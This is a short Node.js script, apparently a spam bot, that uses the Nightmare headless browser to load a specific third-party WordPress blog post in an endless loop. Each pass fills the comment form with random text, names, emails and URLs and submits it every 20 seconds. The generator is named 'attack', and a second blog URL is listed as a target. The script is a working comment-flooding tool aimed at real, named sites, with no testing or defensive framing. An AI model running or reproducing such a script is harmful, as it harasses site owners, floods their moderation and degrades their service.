const Nightmare = require('nightmare');
const vo = require('vo');
const Chance = require('chance');

const chance = new Chance();

const nightmare = new Nightmare({
    // show: true,
    waitTimeout: 30 * 60 * 1000,
    // dock: true,
    // 'proxy-server': '127.0.0.1:1080',
    // 'ignore-certificate-errors': true,
});

const url = 'https://blog.h5devhoward.com/2017/06/09/wordpress-config/';

const joshua = 'http://blog.orzy.me/archives/19';

/* eslint func-style: 0 */
const attack = function* () {
    yield nightmare
        .viewport(1280, 1280);

    const condition = true;
    while (condition) {
        yield nightmare
            // .refresh()
            .goto(url)
            .scrollTo('100%', 0)
            .wait('#comment')
            .insert('#comment', chance.paragraph())
            .wait(() => {
                document.getElementById('author').value = '';

                return true;
            })
            .wait('#author')
            .insert('#author', chance.name())
            .wait('#email')
            .wait(() => {
                document.getElementById('email').value = '';

                return true;
            })
            .insert('#email', chance.email())
            .wait('#url')
            .wait(() => {
                document.getElementById('url').value = '';

                return true;
            })
            .insert('#url', chance.url())
            .click('#submit')
            .wait(20 * 1000);
    }

    return '233333';
};

vo(attack)((err, result) => {
    if (err) console.error(err);
    console.log(result);
});
